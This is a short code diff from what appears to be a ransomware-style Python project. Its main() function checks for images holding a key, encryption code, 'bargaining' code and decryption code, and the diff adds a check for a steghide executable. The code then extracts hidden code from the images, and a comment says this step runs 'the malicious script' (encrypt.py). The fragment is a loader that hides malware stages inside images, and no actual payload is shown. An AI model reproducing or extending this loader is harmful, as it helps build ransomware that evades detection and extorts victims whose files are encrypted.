@@ -21,8 +21,9 @@ def main():
     encrypt_code_found: bool = os.path.exists(image_containing_encryption_code)
     bargain_code_found: bool = os.path.exists(image_containing_bargaining_code)
     decrypt_code_found: bool = os.path.exists(image_containing_decryption_code)
+    steghide_found: bool = os.path.exists("steghide-0.5.1-win32\\steghide\\steghide.exe")
     try:
-        if key_found and encrypt_code_found and bargain_code_found and decrypt_code_found:
+        if key_found and encrypt_code_found and bargain_code_found and decrypt_code_found and steghide_found:
             extract_file(image_containing_key, passphrase)
             code_to_encrypt: str = extract_file(image_containing_encryption_code, passphrase)
             # Runs the malicious script (our "encrypt.py")
